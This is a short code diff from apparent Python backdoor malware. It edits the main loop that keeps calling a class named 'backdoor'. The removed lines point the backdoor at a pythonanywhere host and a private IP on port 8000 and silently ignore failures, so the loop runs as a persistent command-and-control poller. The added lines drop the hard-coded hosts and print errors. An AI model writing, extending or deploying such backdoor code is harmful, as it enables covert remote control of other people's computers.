@@ -244,11 +244,6 @@ class backdoor:
 
 while True:
     try:
-        backdoor("https://pybdtest.pythonanywhere.com/") 
-    except:
-        pass
-    try: 
-        backdoor("http://10.2.100.100:8000/") 
-    except:
-        pass
-  
+        backdoor() 
+    except Exception as e:
+        print(e)
